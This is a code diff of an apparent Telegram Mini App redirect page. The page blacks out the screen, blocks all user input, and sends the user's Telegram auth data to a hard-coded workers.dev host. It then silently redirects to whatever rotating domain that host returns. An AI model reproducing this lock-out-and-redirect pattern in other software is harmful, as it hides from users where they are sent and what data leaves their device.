@@ -1,61 +1,178 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
   <title>Init Redirect</title>
-  <script src="https://telegram.org/js/telegram-web-app.js?57"></script>
+  <script src="https://telegram.org/js/telegram-web-app.js?59"></script>
   <style>
-      .no-interaction {
-          pointer-events: none;
-          overflow: hidden;
-
-          user-select: none;
-          -webkit-user-select: none;
-          -moz-user-select: none;
-          -ms-user-select: none;
-
-          -webkit-touch-callout: none;
-
-          -webkit-user-drag: none;
-          user-drag: none;
-
-          -webkit-overflow-scrolling: none;
-
-          touch-action: none;
+      #visual-overlay {
+          position: fixed;
+          inset: 0;
+          z-index: 2147483647;
+          background: black;
+          width: 100vw;
+          height: 100dvh;
       }
-
   </style>
+  <noscript>
+    <style>
+        html, body, html * {
+            pointer-events: none !important;
+            touch-action: none !important;
+            cursor: default !important;
+            -webkit-user-select: none !important;
+            -moz-user-select: none !important;
+            -ms-user-select: none !important;
+            user-select: none !important;
+            -webkit-touch-callout: none !important;
+            -webkit-user-drag: none !important;
+            user-drag: none !important;
+            outline: none !important;
+            caret-color: transparent !important;
+            -webkit-tap-highlight-color: transparent !important;
+        }
+        html, body {
+            overflow: hidden !important;
+            scrollbar-width: none !important;
+        }
+        html::-webkit-scrollbar, body::-webkit-scrollbar {
+            width: 0 !important;
+            height: 0 !important;
+        }
+    </style>
+  </noscript>
+
 </head>
 <body>
-<div class="no-interaction" style="position: absolute; overflow: hidden; top: 0; bottom: 0; left: 0; right: 0; width: 100dvw; height: 100dvh; z-index: 999999; background-color: black; pointer-events: none; touch-action: none; user-drag: none;"></div>
+<div id="visual-overlay" aria-hidden="true"></div>
+
 <script>
-  document.addEventListener('DOMContentLoaded', function() {
-    document.addEventListener('contextmenu', function(e) {
-      e.preventDefault();
+  (() => {
+    const STOP_EVENTS = [
+      // Pointer/mouse
+      'click','dblclick','auxclick','mousedown','mouseup','mousemove','mouseenter','mouseleave',
+      'pointerdown','pointerup','pointermove','pointerenter','pointerleave','pointercancel',
+      'touchstart','touchend','touchmove','touchcancel',
+      'wheel','scroll','gesturestart','gesturechange','gestureend',
+      'dragstart','drag','dragend','drop',
+      'keydown','keypress','keyup','compositionstart','compositionupdate','compositionend',
+      'beforeinput','input','change','paste','copy','cut',
+      'focus','blur','focusin','focusout','contextmenu',
+      'submit','reset',
+    ];
+
+    const stopper = (e) => {
+      try { e.stopImmediatePropagation(); } catch {}
+      try { e.stopPropagation(); } catch {}
+      try { if (typeof e.preventDefault === 'function') e.preventDefault(); } catch {}
       return false;
-    }, true);
+    };
 
-    const noInteractionElement = document.querySelector('.no-interaction');
-    if (noInteractionElement) {
-      noInteractionElement.addEventListener('contextmenu', function(e) {
-        e.preventDefault();
-        e.stopPropagation();
-        return false;
-      }, true);
+    const style = document.createElement('style');
+    style.textContent = `
+    html, body, html * {
+      pointer-events: none !important;
+      touch-action: none !important;
+      cursor: default !important;
+      -webkit-user-select: none !important;
+      -moz-user-select: none !important;
+      -ms-user-select: none !important;
+      user-select: none !important;
+      -webkit-touch-callout: none !important;
+      -webkit-user-drag: none !important;
+      user-drag: none !important;
+      outline: none !important;
+      caret-color: transparent !important;
+      -webkit-tap-highlight-color: transparent !important;
     }
+    html, body {
+      overflow: hidden !important;
+      scrollbar-width: none !important;
+    }
+    html::-webkit-scrollbar, body::-webkit-scrollbar { width: 0 !important; height: 0 !important; }
+  `;
+    (document.head || document.documentElement).appendChild(style);
 
-    const events = ['mousedown', 'mouseup', 'touchstart', 'touchend', 'touchmove', 'click', 'dblclick'];
-    events.forEach(event => {
-      document.addEventListener(event, e => {
-        e.preventDefault();
-        e.stopPropagation();
-      }, true);
+    const applyInert = () => {
+      if (document.body && !document.body.hasAttribute('inert')) {
+        document.body.setAttribute('inert', '');
+      }
+    };
+
+    const disableFocusables = (root = document) => {
+      const focusables = root.querySelectorAll?.('a, button, input, select, textarea, details, summary, [contenteditable], [tabindex]');
+      focusables?.forEach(el => {
+        try { el.setAttribute('tabindex', '-1'); } catch {}
+        try { el.setAttribute('aria-disabled', 'true'); } catch {}
+        try { if ('disabled' in el) el.disabled = true; } catch {}
+        for (const name of Object.getOwnPropertyNames(el)) {
+          if (name.startsWith('on')) {
+            try { el[name] = null; } catch {}
+          }
+        }
+        for (const attr of Array.from(el.attributes || [])) {
+          if (attr.name.startsWith('on')) {
+            try { el.removeAttribute(attr.name); } catch {}
+          }
+        }
+      });
+    };
+
+    const attachAll = () => {
+      const targets = [window, document, document.documentElement, document.body].filter(Boolean);
+      targets.forEach(t => {
+        STOP_EVENTS.forEach(type => {
+          try { t.addEventListener(type, stopper, { capture: true, passive: false }); } catch {}
+        });
+      });
+    };
+
+    const mo = new MutationObserver(muts => {
+      applyInert();
+      for (const m of muts) {
+        if (m.type === 'childList') {
+          m.addedNodes.forEach(node => {
+            if (node.nodeType === 1) {
+              disableFocusables(node);
+              for (const attr of Array.from(node.attributes || [])) {
+                if (attr.name.startsWith('on')) {
+                  try { node.removeAttribute(attr.name); } catch {}
+                }
+              }
+            }
+          });
+        } else if (m.type === 'attributes') {
+          const el = m.target;
+          if (m.attributeName === 'inert' && el === document.body && !el.hasAttribute('inert')) {
+            applyInert();
+          }
+          if (m.attributeName && m.attributeName.startsWith('on')) {
+            try { el.removeAttribute(m.attributeName); } catch {}
+          }
+        }
+      }
     });
 
-  });
+    const init = () => {
+      applyInert();
+      disableFocusables(document);
+      attachAll();
+      try { document.documentElement.style.overflow = 'hidden'; } catch {}
+      try { document.body && (document.body.style.overflow = 'hidden'); } catch {}
+      try {
+        mo.observe(document.documentElement || document, { childList: true, subtree: true, attributes: true });
+      } catch {}
+    };
 
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', init, { once: true });
+    } else {
+      init();
+    }
+  })();
 </script>
+
 <script>
   const fallbackUrl = 'https://http.cat/status/599';
   let tgStorage
@@ -71,24 +188,27 @@
   }
 
   function closeApp() {
-    return;
     // Telegram Web.
     try {
       window.parent.postMessage('web_app_close');
-    } catch {}
+    } catch {
+    }
     try {
       webApp?.close()
-    } catch {}
+    } catch {
+    }
 
     // Telegram for iOS, macOS, Android and Telegram Desktop.
     try {
       window.TelegramWebviewProxy.postEvent('web_app_close');
-    } catch {}
+    } catch {
+    }
 
     // Telegram for Windows Phone or Android.
     try {
       window.external.notify('web_app_close')
-    } catch {}
+    } catch {
+    }
 
     location.replace(fallbackUrl);
   }
@@ -162,8 +282,7 @@
         }
 
         return JSON.parse(result)
-      }
-      catch {
+      } catch {
         return null;
       }
     }
@@ -177,33 +296,26 @@
         }
 
         return result
-      }
-      catch {
+      } catch {
         return null;
       }
     }
   }
 
-  function redirect({
-    origin,
-    pathname,
-    token = null,
-    includeHash = false,
-  }) {
+  function redirect({ origin, pathname, token = null }) {
     try {
       const hostname = new URL(origin).hostname;
       const redirectUrl = new URL(window.location.href)
       redirectUrl.hostname = hostname;
       redirectUrl.protocol = 'https:';
       redirectUrl.pathname = pathname;
-      if (includeHash)
-        redirectUrl.searchParams.set('hash', redirectUrl.hash);
       if (token)
         redirectUrl.searchParams.set('x-my-token', token);
 
       location.replace(redirectUrl.toString());
-    }
-    catch {
+
+      setTimeout(closeApp, 10000);
+    } catch {
       closeApp()
     }
   }
@@ -212,27 +324,24 @@
     try {
       const response = await fetch(new URL(pathname, origin), {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ initData: tgStorage.initData, platform: tgStorage.platform }),
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({initData: tgStorage.initData, platform: tgStorage.platform}),
       });
 
+
       if (!response.ok) {
-        alert(`auth, not ok ${response.ok}`)
-        closeApp()
+        throw new Error('Unauthorized');
       }
 
       const data = await response.json();
 
       if (!data.origin || !data.pathname) {
-        alert(`auth no body, ${data.origin}, ${data.pathname}`)
-        closeApp()
+        throw new Error('Unauthorized');
       }
 
       return data
-    }
-    catch (e) {
-      alert(`auth, catch, ${e.message}`)
-      closeApp()
+    } catch {
+      throw new Error('Unauthorized');
     }
   }
 
@@ -259,35 +368,35 @@
     try {
       tgStorage = new CloudStorage();
 
-      await tgStorage.setJson('reqState', {
-          url: '',
-          reqDate: getDate(),
-          reqCount: 0
-        });
-
       let reqState = await tgStorage.getJson('reqState')
-      if (!reqState) {
+      if (
+        !reqState ||
+        typeof reqState !== 'object' ||
+        !['url', 'reqDate', 'reqCount'].every(k => k in reqState)
+      ) {
         reqState = {
           url: '',
           reqDate: getDate(),
           reqCount: 0
         }
       }
-      
-      // if ((reqState.url || "").endsWith("miniapp")) {
-      //   reqState.url = "";
-      //   reqState.reqCount = 0;
-      // }  
-      
-      alert(JSON.stringify(reqState, null, 2));
+
+      if (reqState.reqDate < getDate()) {
+        reqState = {
+          ...reqState,
+          reqDate: getDate(),
+          reqCount: 0
+        }
+        await tgStorage.setJson('reqState', reqState);
+      }
+
       if (reqState?.url && await isDomainReachable(reqState.url)) {
         const data = await auth(reqState.url)
 
         return redirect(data);
       }
 
-      if (reqState.reqCount >= 30 && reqState.reqDate === getDate()) {
-        alert(`limit, ${reqState.reqCount}, ${reqState.reqDate === getDate()}`)
+      if (reqState.reqCount >= 3 && reqState.reqDate === getDate()) {
         return closeApp()
       }
 
@@ -295,9 +404,8 @@
       reqState.reqDate = getDate()
       await tgStorage.setJson('reqState', reqState)
 
-      const newData = await auth('https://restless-hat-54ab.dev03.workers.dev', '');
+      const newData = await auth('https://restless-hat-54ab.dev03.workers.dev', '/');
       if (reqState.url === newData.origin) {
-        alert(`newData, ${reqState.url} ${newData.origin}`)
         return closeApp()
       }
 
@@ -305,21 +413,16 @@
       await tgStorage.setJson('reqState', reqState)
 
       if (await isDomainReachable(newData.origin)) {
-        return redirect({ ...newData, includeHash: true });
-      }
-      else {
-        alert(`isDomainReachable, ${newData.origin}`)
+        return redirect({...newData});
+      } else {
         return closeApp()
       }
-    }
-    catch (e) {
-      alert(`end, ${e.message}`)
+    } catch {
       closeApp()
     }
   }
 
   document.addEventListener("DOMContentLoaded", run);
-
 </script>
 </body>
 </html>
